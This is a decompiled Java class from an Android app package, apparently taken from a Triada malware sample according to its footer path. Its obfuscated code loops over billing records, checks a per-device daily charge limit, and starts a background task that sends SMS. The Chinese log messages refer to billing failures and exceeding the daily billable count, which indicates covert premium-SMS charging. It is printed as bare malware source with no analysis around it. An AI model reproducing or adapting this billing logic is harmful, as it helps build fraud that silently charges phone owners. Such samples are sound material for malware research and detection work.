package com.android.essdk.eyou.c;

import android.content.Context;
import com.android.essdk.eyou.a.f;
import com.android.essdk.eyou.a.g;
import com.android.essdk.eyou.b.e;
import com.android.essdk.eyou.e.a.d;
import com.android.essdk.eyou.e.b;
import com.android.essdk.eyou.e.d;
import java.util.Iterator;
import java.util.List;

public class c {
  private static c d;
  
  public boolean a = false;
  
  public boolean b = false;
  
  private Context c;
  
  private String e;
  
  private f f;
  
  private d g;
  
  public c(Context paramContext) {
    this.c = paramContext;
  }
  
  public static c a(Context paramContext) {
    if (d == null)
      d = new c(paramContext); 
    return d;
  }
  
  private void a(g paramg) {
    if (paramg == null) {
      b.b("epay_log", "计费失败");
      return;
    } 
    if (paramg.e() != null && paramg.e().size() != 0) {
      b(paramg);
      com.android.essdk.eyou.b.c.a().a(this.c, paramg);
    } 
  }
  
  private void b(g paramg) {
    b.b("OnlineGameFee", "发短信的时间开始");
    (new d(this, paramg)).execute((Object[])new String[] { "" });
  }
  
  public void a(List paramList) {
    if (paramList != null && paramList.size() > 0) {
      Iterator<g> iterator = paramList.iterator();
      while (true) {
        if (iterator.hasNext()) {
          g g = iterator.next();
          if (d.a(2, this.c)) {
            a(g);
            continue;
          } 
          e.a().e(this.c, 105);
          b.b("epay_log", "该设备今日已超过可计费次数上限");
        } 
        return;
      } 
    } 
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/c/c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */